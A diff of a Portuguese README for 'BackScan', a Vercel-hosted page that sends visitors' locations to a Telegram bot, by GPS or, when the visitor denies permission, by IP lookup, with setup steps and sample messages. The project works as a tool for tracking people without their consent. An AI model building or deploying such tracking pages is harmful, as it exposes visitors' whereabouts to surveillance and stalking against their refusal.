@@ -1,84 +1,184 @@
 
-# BackScan API
+# 📍 BackScan - Envio Automático de Localização para o Telegram
 
-Projeto que coleta e envia a localização do usuário via GPS ou IP diretamente para o Telegram.
+Este projeto permite capturar e enviar automaticamente a localização do usuário para um Bot no Telegram, utilizando **GPS** (quando o usuário permite) ou **IP** (quando ele nega ou não autoriza).
 
-## 🚀 Funcionalidade
+Tudo isso rodando 100% online, sem necessidade de servidor próprio — hospedado na **Vercel**.
 
-Quando o usuário acessa a página, o site solicita permissão para obter sua localização via GPS.
-Caso ele negue, o sistema tenta obter a localização aproximada via IP.
+---
 
-A localização é enviada automaticamente para o bot do Telegram configurado.
+## 🚀 Como Funciona
+
+Quando o usuário acessa a página:
+
+✅ Se aceitar o compartilhamento de localização → Captura precisa via **GPS**  
+❌ Se negar → Captura aproximada via **IP**
+
+A localização obtida é enviada automaticamente para o **Telegram**.
 
 ---
 
 ## 🗂️ Estrutura do Projeto
 
 ```
-backscan-api/
+/
 ├── api
-│   └── send-location.js          # Função serverless responsável pelo envio para o Telegram
+│   └── send-location.js   → Função Serverless que envia a localização para o Telegram
 ├── public
-│   ├── index.html                # Página que coleta a localização
-│   └── styles.css                # Estilos da página
-├── package.json                  # Dependências do projeto
-├── package-lock.json             # Controle de versão das dependências
-└── README.md                     # Este arquivo
+│   ├── index.html         → Página exibida para o usuário
+│   └── styles.css         → Estilo visual da página
+├── package.json           → Dependências do projeto (axios)
+└── package-lock.json      → Controle de versão das dependências
+```
+
+✅ O arquivo **package.json** é essencial para que a Vercel instale as dependências.  
+✅ O arquivo **package-lock.json** é opcional, mas recomendado para travar versões.
+
+---
+
+## ⚙️ Passos para Configuração
+
+### 1) Criar um Bot no Telegram
+
+No Telegram, procure por **@BotFather**
+
+Envie o comando:
+
+```
+/newbot
+```
+
+Siga as instruções e crie o nome e o username do seu bot.
+
+O BotFather irá gerar um **TOKEN**.  
+Guarde este token. Exemplo:
+
+```
+7246XXXXXXXXX:AAHLxxxxxxxxyyyyzzzz
 ```
 
 ---
 
-## 📄 Configuração
+### 2) Obter o ID do seu Chat
 
-### 1. Crie um Bot no Telegram
-- Acesse o [@BotFather](https://t.me/BotFather) e crie um novo bot.
-- Anote o **Token do Bot**.
-- Envie qualquer mensagem para o bot ou adicione ele em um grupo.
-- Para descobrir o **chat_id**, acesse:
-  ```
-  https://api.telegram.org/botSEU_BOT_TOKEN/getUpdates
-  ```
+Para saber o ID do seu chat:
 
-### 2. Configure as Variáveis na Vercel
+1. Envie qualquer mensagem para o seu bot.
+2. No navegador, acesse:
 
-No painel do projeto → Settings → Environment Variables:
+```
+https://api.telegram.org/botSEU_BOT_TOKEN/getUpdates
+```
+
+Copie o valor do campo:
+
+```json
+"chat": { "id": 123456789 }
+```
+
+Esse é o **Chat ID**.
+
+---
+
+### 3) Fazer Fork ou Clonar este Repositório
+
+Você pode fazer um Fork ou clonar este projeto no GitHub.
+
+Exemplo:
+
+```bash
+git clone https://github.com/seu-usuario/backscan-api.git
+cd backscan-api
+```
+
+---
+
+### 4) Criar uma Conta na Vercel
+
+Acesse: [https://vercel.com](https://vercel.com)
+
+Faça login (pode usar sua conta do GitHub)
+
+Clique em **New Project → Import Git Repository**
+
+Selecione o repositório do **BackScan**
+
+No final do processo, clique em **Deploy**
+
+---
+
+### 5) Configurar Variáveis de Ambiente na Vercel
+
+Depois do deploy:
+
+No painel do seu projeto na Vercel, clique em:
+
+**Settings → Environment Variables**
+
+Crie as seguintes variáveis:
 
 | Nome                | Valor                     |
 |--------------------|---------------------------|
-| TELEGRAM_BOT_TOKEN | Seu token do bot Telegram |
-| TELEGRAM_CHAT_ID  | ID do chat ou grupo       |
+| TELEGRAM_BOT_TOKEN | O Token do seu bot        |
+| TELEGRAM_CHAT_ID   | O ID do seu chat ou grupo |
+
+Clique em **Save** e depois em **Redeploy**
 
 ---
 
-## 🖥️ Como rodar localmente
+## ✅ Pronto!
 
-```bash
-git clone https://github.com/esojs/backscan-api.git
-cd backscan-api
-npm install
-npm run dev
+Agora você pode acessar seu projeto:
+
 ```
-Acesse: [http://localhost:3000](http://localhost:3000)
+https://seu-projeto.vercel.app
+```
+
+Ao abrir a página:
+
+- Se permitir a localização → será enviada via **GPS**
+- Se negar → será capturada via **IP**
+
+Você receberá uma mensagem no Telegram informando a localização e a fonte (**GPS** ou **IP**).
 
 ---
 
-## ☁️ Como fazer Deploy na Vercel
+## 📥 Exemplo de Mensagem no Telegram
 
-1. Crie um repositório público no GitHub.
-2. Suba os arquivos do projeto.
-3. Na Vercel, clique em **New Project → Import Git Repository**.
-4. Configure as variáveis de ambiente.
-5. Clique em **Deploy**.
+Se o usuário permitir:
+
+```
+📍 Localização recebida
+Fonte: Precisa (GPS)
+Latitude: -15.793889
+Longitude: -47.882778
+Maps: https://www.google.com/maps?q=-15.793889,-47.882778
+```
+
+Se o usuário negar:
+
+```
+📍 Localização recebida
+Fonte: Aproximada (IP)
+Latitude: -15.7801
+Longitude: -47.9292
+Maps: https://www.google.com/maps?q=-15.7801,-47.9292
+```
+
+⚠️ Localização aproximada via IP. Pode não ser precisa.
 
 ---
 
-## 🔒 Observação
+## ✅ Tecnologias utilizadas
 
-O projeto busca localização via GPS **somente se o usuário permitir**.
-Caso ele negue, o sistema tentará capturar a localização aproximada via IP.
+- Node.js (Serverless Function na Vercel)
+- HTML/CSS
+- JavaScript (Geolocation API + fetch)
+- Telegram Bot API
+- ipapi.co (para fallback via IP)
 
 ---
 
-## 📌 Licença
+## 📄 Licença
 
-Este projeto é livre para fins de estudo e aprendizado.
+Este projeto foi desenvolvido para fins educacionais e pode ser utilizado e adaptado livremente.
